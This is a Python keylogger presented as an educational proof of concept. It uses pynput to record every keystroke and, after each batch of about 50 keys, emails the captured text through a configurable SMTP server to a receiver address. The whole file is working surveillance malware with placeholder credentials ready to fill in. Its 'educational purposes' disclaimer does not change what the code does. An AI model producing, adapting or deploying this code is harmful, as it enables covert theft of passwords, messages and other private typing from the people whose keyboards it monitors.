# This is a proof of concept keylogger
# It will record the keys typed & when it reaches
# a set limit it will automatically send
# an email containing all keys typed.
# FOR EDUCATIONAL PURPOSES ONLY!!!

# This part of the code imports the necessary modules
# so the action of typing keys can be captured.
# It also allows for the simultaneous tasks of catching
# the key strokes and sending the email.
import pynput
from pynput.keyboard import Key, Listener
import smtplib
import threading

# This part of the code defines how to send the
# email - where to send, and how to send it.
# Input your own details below.
class EmailSender:
    def send_email(self, keys):
        sender_email = "Sender person <send@example.com>"           # Enter sender email here
        receiver_email = "Receiver person <receive@example.com>"    # Enter receiver email here
        subject = "Keylogger text"                                  # Enter email subject
        message = keys                                              # puts logged keys into email body.

        msg = f"Subject: {subject}\n\n{message}"  # This f-string formats the email for readability

        smtp_server = "my smtp server"    # Enter your smtp server
        port = "enter port"               # Enter port to be used
        login = "myemail@email.com"       # Enter sender login username/email
        password = "MY password"          # Enter  sender password 

# The code below is responsible for establishing a secure connection
# with the chosen smtp server, authenticating in with the
# given credentials, sending the email, and closing the
# connection. Finally, it tells you whether the email
# was sent successfully or if it failed to send.
        try:
            server = smtplib.SMTP(smtp_server, port) 
            server.starttls()
            server.login(login, password)
            server.sendmail(sender_email, receiver_email, msg)
            server.quit()
            print("Email sent successfully")
        except Exception as e:
            print("Error - Failed to send email!", e)

# This sets important definitions of how the
# keylogger will function
count = 0                      # starts keylogging count at 0
keys = []                      # creates an empty list to store keystrokes
email_sender = EmailSender()   # Establishes EmailSender instance for
                               # sending the email notifications

# This handles the key press events,
# how to log the keys, and when to send
# the email when count reaches a certain number.
def on_press(key):
    print("Key pressed")     # prints a message when a key is pressed
    global keys, count       # Access global variable for the keys & count
    if key == Key.space:
        keys.append(" ")     # Represents the space key as a space character
    else:
        keys.append(str(key).replace("'", ""))
    count += 1               # The increment at which to count logged keys
    if count > 50:           # Checks if the count exceeds threshold(adjust as desired)
        count = 0            # reset the count
        email_thread = threading.Thread(target=email, args=(''.join(keys),))
        email_thread.start()
        keys = []            # This clears the list of logged keys for the next batch.


# This section takes the logged keys and
# formats them so its easier to read.
# in the sent email.
def email(keys):
    message = ""   # starts an empty string to store the formatted message
    for key in keys:
        if key == Key.space:
            message += " " # put a space instead of typing"key.space" for spacebar
        else:
            message += str(key).replace("'", "") # removes single quotes from other keys

    print(message)     # prints formatted messsage for debugging
    email_sender.send_email(message) # Emails the formatted keys


# This defines what action to take when a key is released.
def on_release(key):
    print("Key released:", key) # Prints the key that's just been released
   
# Tells the listener to listen for key press & releases
with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()




